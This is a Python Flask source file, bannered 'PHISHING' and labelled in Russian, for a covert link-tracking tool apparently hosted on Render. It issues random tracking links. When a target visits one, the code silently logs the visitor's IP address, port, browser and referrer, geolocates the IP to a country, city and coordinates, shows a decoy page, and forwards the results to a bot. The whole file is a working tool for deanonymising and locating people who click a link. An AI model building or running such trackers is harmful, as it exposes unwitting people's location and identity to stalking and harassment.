import socket
import threading
from flask import Flask, request, render_template_string
import requests
import json
import random
import string
import time
import os

app = Flask(__name__)

BANNER = """
██████╗░██╗░░██╗██╗░██████╗██╗░░██╗██╗███╗░░██╗░██████╗░
██╔══██╗██║░░██║██║██╔════╝██║░░██║██║████╗░██║██╔════╝░
██████╔╝███████║██║╚█████╗░███████║██║██╔██╗██║██║░░██╗░
██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║██║██║╚████║██║░░╚██╗
██║░░░░░██║░░██║██║██████╔╝██║░░██║██║██║░╚███║╚██████╔╝
╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░
"""

tracking_data = {}
active_tokens = set()

def generate_url():
    chars = string.ascii_lowercase + string.digits
    token = ''.join(random.choice(chars) for _ in range(10))
    base_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://onion-web.onrender.com')
    return f"{base_url}/{token}"

def get_ip_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()
        return data
    except:
        return {}

def start_bot(info):
    import bot
    bot.send_info(info)

@app.route('/')
def index():
    url = generate_url()
    token = url.split('/')[-1]
    active_tokens.add(token)
    tracking_data[token] = None
    
    return f"""
    <html>
        <head>
            <title>Onion Web</title>
            <style>
                body {{ 
                    background: #000; 
                    color: #00ff00; 
                    font-family: 'Courier New', monospace;
                    text-align: center;
                    padding: 50px;
                }}
                .banner {{ 
                    font-size: 24px; 
                    margin-bottom: 30px;
                }}
                .url {{
                    background: #111;
                    padding: 20px;
                    border: 1px solid #00ff00;
                    margin: 20px auto;
                    max-width: 600px;
                    word-break: break-all;
                }}
                .info {{
                    color: #888;
                    margin-top: 30px;
                }}
            </style>
        </head>
        <body>
            <div class="banner">ONION WEB TRACKER</div>
            <div>Ваша отслеживаемая ссылка:</div>
            <div class="url">{url}</div>
            <div class="info">Ссылка активна в течение 24 часов</div>
        </body>
    </html>
    """

@app.route('/<token>')
def track_visit(token):
    if token not in active_tokens:
        return "Not Found", 404
    
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    referrer = request.headers.get('Referer')
    
    ip_info = get_ip_info(ip)
    
    info = {
        'ip': ip,
        'port': request.environ.get('REMOTE_PORT'),
        'user_agent': user_agent,
        'referrer': referrer,
        'country': ip_info.get('country', 'N/A'),
        'city': ip_info.get('city', 'N/A'),
        'lon': ip_info.get('lon', 'N/A'),
        'lat': ip_info.get('lat', 'N/A'),
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
    }
    
    tracking_data[token] = info
    
    with open('onion.html', 'r', encoding='utf-8') as f:
        html_content = f.read()
    
    return html_content

@app.route('/admin')
def admin():
    stats = {
        'active_tokens': len(active_tokens),
        'total_tracked': len([t for t in tracking_data.values() if t]),
        'uptime': time.strftime('%Y-%m-%d %H:%M:%S')
    }
    
    return f"""
    <html>
        <head>
            <title>Admin Panel</title>
            <style>
                body {{ background: #000; color: #00ff00; font-family: monospace; padding: 20px; }}
                .stat {{ margin: 10px 0; }}
            </style>
        </head>
        <body>
            <h1>Admin Panel</h1>
            <div class="stat">Active tokens: {stats['active_tokens']}</div>
            <div class="stat">Total tracked: {stats['total_tracked']}</div>
            <div class="stat">Uptime: {stats['uptime']}</div>
        </body>
    </html>
    """

def start_flask():
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)

def monitor_tracking():
    while True:
        for token in list(active_tokens):
            if tracking_data.get(token):
                info = tracking_data[token]
                print(f"""
🎯 Обнаружен переход по ссылке!

📊 Информация о сети:
├ IP - адрес: {info['ip']}
├ User - Agent: {info['user_agent']}
├ Referrer: {info['referrer']}
├ Время: {info['timestamp']}

📍 Местоположение:
├ Страна: {info['country']}
├ Город: {info['city']}
├ Долгота: {info['lon']}
└ Широта: {info['lat']}
""")
                start_bot(info)
                del tracking_data[token]
        
        time.sleep(1)

def cleanup_tokens():
    while True:
        time.sleep(3600)
        if len(active_tokens) > 100:
            tokens_to_remove = list(active_tokens)[:50]
            for token in tokens_to_remove:
                active_tokens.discard(token)
                if token in tracking_data:
                    del tracking_data[token]
            print(f"🧹 Очищено {len(tokens_to_remove)} старых токенов")

if __name__ == "__main__":
    print(BANNER)
    
    flask_thread = threading.Thread(target=start_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    monitor_thread = threading.Thread(target=monitor_tracking)
    monitor_thread.daemon = True
    monitor_thread.start()
    
    cleanup_thread = threading.Thread(target=cleanup_tokens)
    cleanup_thread.daemon = True
    cleanup_thread.start()
    
    print("🚀 Сервер запущен и работает 24/7")
    print("🌐 Доступен по адресу: https://onion-web.onrender.com")
    print("📊 Генерация ссылок активна")
    print("👁️  Отслеживание переходов запущено")
    print("⏹️  Для остановки нажмите Ctrl+C")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 Сервер остановлен")
